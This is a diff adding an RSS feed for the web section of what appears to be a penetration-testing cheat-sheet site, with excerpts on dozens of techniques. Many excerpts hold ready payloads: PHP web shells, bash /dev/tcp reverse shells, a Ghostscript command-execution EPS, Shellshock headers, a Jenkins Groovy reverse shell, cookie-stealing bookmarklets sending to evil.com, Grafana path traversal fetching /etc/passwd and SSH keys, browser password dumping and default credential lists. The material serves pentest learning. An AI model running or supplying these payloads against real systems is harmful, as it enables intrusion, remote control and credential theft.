@@ -1,0 +1,306 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Web on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/</link>
+    <description>Recent content in Web on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:54:17 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Go SSTI</title>
+      <link>https://documentnation.github.io/docs/hdks/web/go-ssti/</link>
+      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/go-ssti/</guid>
+      <description>Investigation link import &amp;#34;html/template&amp;#34; ... template.New(&amp;#34;foo&amp;#34;).Parse(&amp;#34;{{ . }}&amp;#34;) If a website uses a web framework written in Golang and uses html/template module for parsing a template file or strings, we may inject this template with our custom template file/string.&#xA;Exploit linkAssume a web application defines User struct, GetFile method, and ExecuteCmd method.&#xA;// `main.go` of target website type User struct { Id string Name string } // Read contents of the file and output it.</description>
+    </item>
+    <item>
+      <title>PHP RCE Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/</link>
+      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/</guid>
+      <description>Web Shell link &amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt; &amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt; &amp;lt;%3fphp&amp;#43;system($_[&amp;#39;cmd&amp;#39;]);%3f&amp;gt; &amp;lt;%3fphp&amp;#43;echo&amp;#43;system($_[&amp;#39;cmd&amp;#39;]);%3f&amp;gt; We can access to /?cmd=whoami.&#xA;Reverse Shell link &amp;lt;?php system(&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;);?&amp;gt; &amp;lt;?php system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;);?&amp;gt; &amp;lt;%3fphp&amp;#43;system(&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;%2fdev%2ftcp%2f10.0.0.1%2f4444&amp;#43;0&amp;gt;%261&amp;#39;);%3f&amp;gt; &amp;lt;%3fphp&amp;#43;system(&amp;#39;bash&amp;#43;-c&amp;#43;&amp;#34;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;%2fdev%2ftcp%2f10.0.0.1%2f4444&amp;#43;0&amp;gt;%261&amp;#34;&amp;#39;);%3f&amp;gt; </description>
+    </item>
+    <item>
+      <title>Dompdf RCE</title>
+      <link>https://documentnation.github.io/docs/hdks/web/dompdf-rce/</link>
+      <pubDate>Tue, 12 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/dompdf-rce/</guid>
+      <description>Exploitation link1. Create Malicious Font linkFirst off, we need to prepare the malicious .ttf file.&#xA;Here, we find the .ttf file in our local system and copy it to the current directory and change the extention ttf to php because we want to execute PHP script.&#xA;find / -name &amp;#34;*.ttf&amp;#34; 2&amp;gt;/dev/null cp /path/to/example.ttf ./evil.php Then add the PHP payload at the end of the file.&#xA;... &amp;lt;?php system(&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
+    </item>
+    <item>
+      <title>Broken Link Hijacking</title>
+      <link>https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/</link>
+      <pubDate>Sat, 26 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/</guid>
+      <description>Investigation linkAssume that target website loads external JavaScript file in example.com no longer exists as below.&#xA;&amp;lt;script src=&amp;#34;//example.com/script.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; If attacker bought this domain, he can host arbitrary JavaScript file named script.js in the example.com root directory.&#xA;Exploitation Examples linkAttacker can write arbitrary code for compromising users in script.js as example above.&#xA;For example, if target website includes sensitive information of authenticated user in the page where the broken link is loaded, attackers can send these information to their owned server.</description>
+    </item>
+    <item>
+      <title>GhostScript Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/</link>
+      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/</guid>
+      <description>Arbitrary Command Execution (CVE-2018-16509) Before v9.24 linkReference: https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509&#xA;If target website uses the functionality which allows user to upload image files associated Python&amp;rsquo;s Pillow (PIL), we can execute remote command over GhostScript vulnerability (-dSAFER bypass using OutputFile).&#xA;Create an image file in which contents as below, then upload it. Command will be executed in the target server.&#xA;%!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: -0 -0 100 100 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%touch /tmp/hello.</description>
+    </item>
+    <item>
+      <title>HTML Smuggling</title>
+      <link>https://documentnation.github.io/docs/hdks/web/html-smuggling/</link>
+      <pubDate>Wed, 26 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/html-smuggling/</guid>
+      <description>Exploitation linkAttackers can use anchor tag to invite victim to download a malicious file as below. When clicking, the malicious file is downloaded as the name “payment.docx”.&#xA;&amp;lt;a href=&amp;#34;/malicious_doc.docx&amp;#34; download=&amp;#34;payment.docx&amp;#34;&amp;gt;Cliek Here&amp;lt;/a&amp;gt; Alternatively, attackers can also use JavaScript, then let browsers to download a malicious file when loading the page, or invite victim to click download button.&#xA;var a = document.createElement(&amp;#39;a&amp;#39;); a.download = &amp;#39;malicious_doc.docx&amp;#39; Using JavaScript Blob linkBy using blob, attackers can let victim to download a malicious file while obfuscate its content by encoding/decoding malicious code.</description>
+    </item>
+    <item>
+      <title>TeamCity Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/</link>
+      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/</guid>
+      <description>Common Directories link /admin /admin/admin.html Interesting Files in Systems link TeamCity/conf/teamcity-startup.propertie .BuildServer/system Find Super User Authentication Tokens linkIf we find a super user authentication token, we can login as super user using the token.&#xA;grep -rni &amp;#39;authentication token&amp;#39; TeamCity/logs grep -rni &amp;#39;Super user authentication token&amp;#39; TeamCity/logs grep -rni &amp;#39;token&amp;#39; TeamCity/logs After retrieving, we can login as administrator by entering the token in the password field and empty the username.&#xA;Arbitrary Command Execution by Custom Script link Login as admin user.</description>
+    </item>
+    <item>
+      <title>Dump Git Repository from Website</title>
+      <link>https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/</link>
+      <pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/</guid>
+      <description>Dumping linkWe can simply use wget command in Linux to download the git repository.&#xA;After that, we can investigate files or all histories.&#xA;# -r: Recursive wget -r https://example.com/.git/ cd example.com git log --stat git checkout &amp;lt;commit_id&amp;gt; Dumping with gitdumper and extracter linkGitTools downloads Git repository of the web application.&#xA;To dump the repository, execute the following commands.&#xA;wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh chmod &amp;#43;x gitdumper.sh ./gitdumper.sh https://example.com/.git/ ./example We should get the git repository in local.</description>
+    </item>
+    <item>
+      <title>Extract Web Browser Passwords</title>
+      <link>https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/</link>
+      <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/</guid>
+      <description>Firefox link wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py python3 firefox_decrypt.py Google Chrome link wget https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py python3 decrypt_chrome_password.py </description>
+    </item>
+    <item>
+      <title>Bookmarklet Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/</link>
+      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/</guid>
+      <description>Exploitation linkMalicious Links linkAttackers induce victims to add their malicious link into the bookmark menu as below.&#xA;&amp;lt;p&amp;gt;Drag and drop the following link into the bookmark menu to access easily!&amp;lt;/p&amp;gt; &amp;lt;a href=&amp;#34;javascript:window.location=&amp;#39;https://evil.com/&amp;#39;&amp;#34;&amp;gt;Example.com&amp;lt;/a&amp;gt; In addition, if the current website does not set HttpOnly flag on the Set-Cookie response header, attackers can get the victim&amp;rsquo;s cookie and send it to the malicious website as below.&#xA;&amp;lt;p&amp;gt;Drag and drop me the following link into the bookmark menu to access easily!</description>
+    </item>
+    <item>
+      <title>JWT (Json Web Token) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/jwt-pentesting/</link>
+      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/jwt-pentesting/</guid>
+      <description>Decode JWT link There are some online JWT decoder/encoder tools like JWT.io. CyberChef can be used for JWT decode. Manipulate JWT linkIf the website uses JWT and we can see the token, copy the JWT and paste it in jwt.io.&#xA;Replace the &amp;ldquo;alg&amp;rdquo; value with &amp;ldquo;none&amp;rdquo; in header. (try the alg header variations such as &amp;ldquo;none&amp;rdquo;, &amp;ldquo;None&amp;rdquo;, &amp;ldquo;nOnE&amp;rdquo;, &amp;ldquo;NONE&amp;rdquo;.) Replace arbitrary values of the payload e.g. &amp;ldquo;username&amp;rdquo; with &amp;ldquo;admin&amp;rdquo;. Empty the signature field.</description>
+    </item>
+    <item>
+      <title>Cacti Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</link>
+      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</guid>
+      <description>Default Credentials link admin:admin Common Directories link /include/config.php Remote Code Execution (RCE) CVE-2022-46169 linkReference: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/&#xA;msfconsole msf&amp;gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection msf&amp;gt; (set options...) msf&amp;gt; run Also we can refer to Exploit DB.</description>
+    </item>
+    <item>
+      <title>Icinga Web Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</link>
+      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</guid>
+      <description>Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code.&#xA;Automation linkThis repository is available for reverse shell automatically.&#xA;In local machine, start a listener.&#xA;nc -lvnp 4444 Next create a PEM file and download the script, then execute it.&#xA;ssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I &amp;lt;local-ip&amp;gt; -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.</description>
+    </item>
+    <item>
+      <title>Apache Zeppelin Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/</guid>
+      <description>Authentication Config File link /shiro.ini Default Credentials link admin:admin admin:password1 user1:password2 user1:role1 user1:role2 user2:password3 user2:role3 user3:password4 user3:role2 RCE in Notebooks linkWe can execute remote OS command in notebooks. Access to the notebook and execute the following scripts.&#xA;%python import os # Configurations os.system(&amp;#39;cat conf/shiro.ini&amp;#39;) Reverse Shell linkBefore executing the following script, we need to start a listener such as nc -lvnp 4444 in local machine.&#xA;%python import os,pty,socket;s=socket.socket();s.connect((&amp;#34;10.0.0.1&amp;#34;, 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.</description>
+    </item>
+    <item>
+      <title>LimeSurvey Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/</link>
+      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/</guid>
+      <description>Default Credentials link admin:password Remote Code Execution (RCE) version &amp;lt; 3.16 linkReference: https://www.exploit-db.com/exploits/46634</description>
+    </item>
+    <item>
+      <title>PHP hash_hmac Bypass</title>
+      <link>https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/</link>
+      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/</guid>
+      <description>Investigation linkIf the website uses hash_hmac function on PHP as below, we can bypass by injecting parameters.&#xA;&amp;lt;?php if (empty($_POST[&amp;#39;hmac&amp;#39;]) || empty($_POST[&amp;#39;host&amp;#39;]) { header(&amp;#39;HTTP/1.0 400 Bad Request&amp;#39;); exit; } if (isset($_POST[&amp;#39;nonce&amp;#39;]) $secret = hash_hmac(&amp;#39;sha256&amp;#39;, $_POST[&amp;#39;nonce&amp;#39;], $secret); $hmac = hash_hmac(&amp;#39;sha256&amp;#39;, $_POST[&amp;#39;host&amp;#39;], $secret); if ($hmac !== $_POST[&amp;#39;hmac&amp;#39;]) { header(&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;); exit; } ?&amp;gt; When executing the following command, the hash_hmac returns false.&#xA;php -r &amp;#34;echo hash_hmac(&amp;#39;sha256&amp;#39;, Array(), &amp;#39;secret&amp;#39;)==false;&amp;#34; # Output PHP Warning: hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1 1 Exploitation linkCreate a Hmac hash by running below.</description>
+    </item>
+    <item>
+      <title>Java RMI Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/</link>
+      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/</guid>
+      <description>No content yet.</description>
+    </item>
+    <item>
+      <title>JBOSS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/jboss-pentesting/</link>
+      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/jboss-pentesting/</guid>
+      <description>Enumeration link msfconsole msf &amp;gt; use auxiliary/scanner/http/jboss_vulnscan Common Directories link /admin-console/ /invoker/JMXInvokerServlet /jbossws/ /jmx-console/ /jmx-console/HtmlAdaptor /management /manager /status?full=true /web-console/ /web-console/Invoker /web-console/ServerInfo.jsp Default Credentials link admin:admin Exploitation linkJexBoss is available as an exploitation CLI tool.&#xA;git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip3 install -r requirements.txt python3 jexboss.py -host https://example.com:8080 # Reverse Shell Shell&amp;gt; /bin/bash -i &amp;gt; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1 </description>
+    </item>
+    <item>
+      <title>CGI Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cgi-pentesting/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cgi-pentesting/</guid>
+      <description>Enumeration CGI Scripts link ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt Shellshock linkShellshock is the vulnerability of bash v1.0.3-4.3 that allows users to execute arbitrary commands. If we found the CGI script under /cgi-bin/, modifying HTTP header to remote code execution.&#xA;GET /cgi-bin/example.cgi HTTP/1.1 User-Agent: () { :; }; /bin/bash -c &amp;#34;sleep 5&amp;#34; Cookie: () { :; }; /bin/bash -c &amp;#34;sleep 5&amp;#34; # Reverse Shell User-Agent: () { :; }; /bin/bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
+    </item>
+    <item>
+      <title>PHP Srand Time Abusing</title>
+      <link>https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/</link>
+      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/</guid>
+      <description>Investigation link function generate_random_number() { srand(time()); // Some code for generating random number... return random_numbers; } For example, assume website uses the above function that generates random numbers or strings to be used for authentications such as activation code, multi-factor security code.&#xA;In such cases, we can replace the “time()” function with the “strtotime()” to make the result to be non-random.&#xA;Exploitation link1. Send Request linkFirst off, send the request for executing the desired function e.</description>
+    </item>
+    <item>
+      <title>WebSocket Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</link>
+      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</guid>
+      <description>Connect with CLI linkwebsocat is a command-line client for WebSockets, like netcat for&#xA;websocat ws://&amp;lt;ip&amp;gt;/ Connect with Python Script link import websocket,json ws = websocket.WebSocket() ws.connect(&amp;#34;ws://10.0.0.1/&amp;#34;) d = {&amp;#34;message&amp;#34;: &amp;#34;hello&amp;#34;} data = str(json.dumps(d)) ws.send(data) result = ws.recv() print(json.loads(result)) As above, we can manipulate the data to send. For example,&#xA;{&amp;#34;message&amp;#34;: &amp;#34;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;} If the website reflects the result of the above interactions, we can affect the website.&#xA;Blind SQL Injection linkFirst, create a Python script to establish a middleware server to forward sqlmap payloads to the target WebSocket server.</description>
+    </item>
+    <item>
+      <title>Codiad Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</link>
+      <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</guid>
+      <description>Default Credentials link # Docker image - https://hub.docker.com/r/bitnami/codiad user:bitnami Enumeration link # Get current directory in the system /components/project/controller.php?action=get_current Remote Code Execution (RCE) v2.8.4 link wget https://www.exploit-db.com/exploits/49705 -O exploit.py # Linux python3 exploit.py https://example.com/ admin admin &amp;lt;local-ip&amp;gt; 4444 linux # Windows python3 exploit.py https://example.com/ admin admin &amp;lt;local-ip&amp;gt; 4444 windows </description>
+    </item>
+    <item>
+      <title>Apache ActiveMQ Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</link>
+      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</guid>
+      <description>Default Credentials link admin:admin Interaction with MQTT linkIf the MQTT server is runnong on the target system, we can subscribe/publish to a topic in ActiveMQ using MQTT client.&#xA;Subscribe to a Topic link # -h: Host # -t: Topic name # -V: MQTT protocol version (5, 31, 311) mosquitto_sub -h example.com -u admin -P admin -t &amp;#39;example/topic&amp;#39; -V 31 Web Shell by File Upload JSP linkActiveMQ is vulnerable to web shell via file upload an arbitrary JSP file.</description>
+    </item>
+    <item>
+      <title>ClipBucket Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/</link>
+      <pubDate>Sun, 19 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/</guid>
+      <description>Arbitrary File Upload &amp;lt; v4.0.0 linkClipBucket versions before 4.0.0 is vulnerable to file upload in ‘uploader’ actions. We can upload arbitrary files so we can execute reverse shell.&#xA;1. Prepare Payload linkCreate a PHP script to reverse shell in local machine.&#xA;cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php Update $ip and $port with your local ip address and port.&#xA;2. Upload the Payload linkNext upload the above PHP script to the target website.&#xA;curl -F &amp;#34;file=@shell.</description>
+    </item>
+    <item>
+      <title>Apache Tomcat Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/</link>
+      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/</guid>
+      <description>Directories linkBelow are common directories for Apache Tomcat.&#xA;/examples /examples/jsp/cal/login.html /examples/jsp/error/error.html /examples/jsp/snp/snoop.jsp /examples/servlet/HelloWorldEXample /examples/servlet/JndiServlet /examples/servlet/RequestHeaderExample /examples/servlet/RequestInfoExample /examples/servlet/RequestParamExample /host-manager /manager /manager/jmxproxy/?qry=STUFF /manager/status /manager/status/all # We can execute commands in /manager/text/ directory /manager/text/{command}?{parameters} /manager/text/deploy?path=/foo /manager/text/list /manager/text/resources /manager/text/serverinfo /manager/text/vminfo Directory Discovery linkTo enumerate directories automatically, use fuzzing tools.&#xA;ffuf -u https://example.com/FUZZ -w directories.txt ffuf -u https://example.com/host-manager/FUZZ -w ffuf -u https://example.com/manager/FUZZ -w directories.txt Credentials linkBelow are common credentials for the manager app in Tomcat.</description>
+    </item>
+    <item>
+      <title>Log4j Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</link>
+      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</guid>
+      <description>msfconsole msf&amp;gt; use exploit/multi/http/log4shell_header_injection msf&amp;gt; set HTTP_HEADER ACCEPT msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set SRVHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set SRVPORT 1389 # e.g. Nagios msf&amp;gt; set TARGETURI /~logs msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Exploit Apache Solr (JNDI) linkYou need to prepare your four local terminals.&#xA;1. Start LDAP Server on Your Local Terminal 1 link Install Maven&#xA;sudo apt install maven Get the Payload&#xA;Download the repository.&#xA;git clone https://github.</description>
+    </item>
+    <item>
+      <title>Browser in the Browser (BITB) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/</link>
+      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/</guid>
+      <description>Use Templates linkThis repository is useful for attacking.</description>
+    </item>
+    <item>
+      <title>OpenCATS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/opencats-pentesting/</link>
+      <pubDate>Tue, 31 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/opencats-pentesting/</guid>
+      <description>Default Credentials link admin:admin admin:cats </description>
+    </item>
+    <item>
+      <title>Restaurant Management System (RMS) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/restaurant-management-system/</link>
+      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/restaurant-management-system/</guid>
+      <description>Remote Code Execution (RCE) v1.0 linkSee the Exploit-DB for details.&#xA;python3 rms-rce.py https://example.com/rms/ When uploading successfully, we can access to https://example.com/rms/images/reverse-shell.php?cmd=id</description>
+    </item>
+    <item>
+      <title>WebAnno Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/webanno-pentesting/</link>
+      <pubDate>Tue, 24 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/webanno-pentesting/</guid>
+      <description>Default Credentials link admin:admin Reverse Shell linkIf the target system opens the website assoated with WebAnno service, we can execute reverse shell by uploading the payload and access to the webpage hosts the payload.&#xA;1. Go to the Upload Screen in Dashboard link Login Click “Projects”. Select the project in left pane. Click Documents tab. 2. Prepare Payload linkWebAnno allows us to upload arbitrary file format, so we can upload PHP file for reverse shell.</description>
+    </item>
+    <item>
+      <title>Grafana Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/grafana-pentesting/</link>
+      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/grafana-pentesting/</guid>
+      <description>Default Credential link admin:admin admin:prom-operator Configuration File linkThe configuration file contains the admin credentials. See the “admin_user” and “admin_password” section in the file.&#xA;/etc/grafana/grafana.ini Path Traversal link curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd -o passwd curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini -o grafana.ini curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.bash_history curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.bash_history Getting a Shell vis JWT, Grafana Pod linkSome Grafana versions are vulnerable to Path Traversal. Kubernetes creates environment variables by default.</description>
+    </item>
+    <item>
+      <title>WebDAV Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/webdav-pentesting/</link>
+      <pubDate>Mon, 09 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/webdav-pentesting/</guid>
+      <description>Enumeration link msfconsole msf&amp;gt; use auxiliary/scanner/http/webdav_scanner Default Credentials link wampp:xampp Reverse Shell link1. Check if the exploit can be uploaded link davtest -url http://example.com/davdir -auth &amp;#39;user:pass&amp;#39; 2. Upload the Reverse Shell Script linkIf we can upload the file e.g. PHP file, upload the script for reverse shell.&#xA;davtest -url http://example.com/davdir -auth &amp;#39;user:pass&amp;#39; -uploadfile shell.php -uploadloc shell.php 3. Get a Shell linkIn local machine, start listener for getting a shell.&#xA;nc -lvnp 4444 Now access to http://example.</description>
+    </item>
+    <item>
+      <title>Jenkins Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</link>
+      <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</guid>
+      <description>Brute Force Credentials link msfconsole msf &amp;gt; use auxiliary/scanner/http/jenkins_login Reverse Shell on Dashboard linkYou need to have the credential.&#xA;Opening Listener on Your Local Machine&#xA;nc -lvnp 4444 Login to Jenkins&#xA;Access &amp;ldquo;http://localhost:8080&amp;rdquo; in browser and login.&#xA;Click &amp;ldquo;Manage Jenkins&amp;rdquo; -&amp;gt; &amp;ldquo;Script Console&amp;rdquo;&#xA;Add the Payload in the Console&#xA;r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/&amp;lt;Attacker_IP&amp;gt;/4444; cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.</description>
+    </item>
+    <item>
+      <title>Web Browser Settings for Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/</link>
+      <pubDate>Sat, 24 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/</guid>
+      <description>Bypass Port Protection linkMany browsers don&amp;rsquo;t accept uncommon ports for HTTP (HTTPS). For example, when we attempt to access http://example.com:22, browsers present that it cannot be accessed.&#xA;To release such a restricted thing, we can edit the setting in browsers.&#xA;Firefox link Enter &amp;ldquo;about:config&amp;rdquo; in search bar. Input &amp;ldquo;network.security.ports.banned.override&amp;rdquo; in the form. Add the desired port (e.g. “22”) to string. </description>
+    </item>
+    <item>
+      <title>Tiny File Manager Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/</guid>
+      <description>Default Credentials link admin:admin@123 user:12345 Reverse Shell linkIf we can login and access the dashboard of the Tiny File Manager, upload the reverse shell script and get a shell.&#xA;First, download the reverse shell script.&#xA;wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O shell.php Update values of “$ip” and “$port” in the above script to our local ip and port for listener which will start. Then upload the script to the arbitrary folder in the Tiny File Manager dashboard.</description>
+    </item>
+    <item>
+      <title>Web PHP Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/web-php-pentesting/</link>
+      <pubDate>Tue, 20 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/web-php-pentesting/</guid>
